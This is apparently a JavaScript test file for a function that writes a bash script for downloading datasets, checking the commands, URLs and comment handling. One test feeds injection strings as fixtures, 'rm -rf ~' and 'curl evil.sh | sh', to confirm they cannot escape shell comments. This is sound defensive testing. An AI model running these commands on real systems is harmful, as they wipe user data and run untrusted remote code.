import { test } from 'node:test';
import assert from 'node:assert/strict';
import { manifestText } from '../js/manifest.js';

const kaggleDs = {
  title: 'Kaggle Set', source: 'Kaggle', license: 'CC0',
  url: 'https://www.kaggle.com/datasets/o/s', kaggleRef: 'o/s',
};
const directDs = {
  title: 'Direct Set', source: 'World Bank', license: 'CC BY 4.0',
  url: 'https://data.worldbank.org/indicator/X',
};

test('manifest contains both sections with correct commands', () => {
  const text = manifestText([kaggleDs, directDs]);
  assert.ok(text.startsWith('#!/usr/bin/env bash'));
  assert.ok(text.includes('kaggle datasets download -d o/s'));
  assert.ok(text.includes('https://data.worldbank.org/indicator/X'));
  assert.ok(text.includes('kagglehub.dataset_download("o/s")'));
  // Kaggle entries include their page URL too — the manifest is a complete URL inventory
  assert.ok(text.includes('https://www.kaggle.com/datasets/o/s'));
});

test('every non-command line is a comment (script stays runnable)', () => {
  const text = manifestText([kaggleDs, directDs]);
  for (const line of text.split('\n')) {
    if (!line.trim()) continue;
    assert.ok(
      line.startsWith('#') || line.startsWith('kaggle datasets download -d '),
      `unexpected executable line: ${line}`
    );
  }
});

test('newlines in catalog strings cannot escape shell comments', () => {
  const evil = {
    title: 'Nice title\nrm -rf ~\n# innocuous',
    source: 'x\ncurl evil.sh | sh',
    license: 'MIT',
    url: 'https://example.com/data',
  };
  const text = manifestText([evil]);
  for (const line of text.split('\n')) {
    if (!line.trim()) continue;
    assert.ok(line.startsWith('#'), `injected executable line: ${line}`);
  }
});

test('URL fragments survive intact in the manifest', () => {
  const text = manifestText([{
    title: 'FAOSTAT QCL', source: 'FAO', license: 'CC BY 4.0',
    url: 'https://www.fao.org/faostat/en/#data/QCL',
  }]);
  assert.ok(text.includes('https://www.fao.org/faostat/en/#data/QCL'));
});

test('empty passport still produces a valid header', () => {
  const text = manifestText([]);
  assert.ok(text.includes('0 datasets'));
});
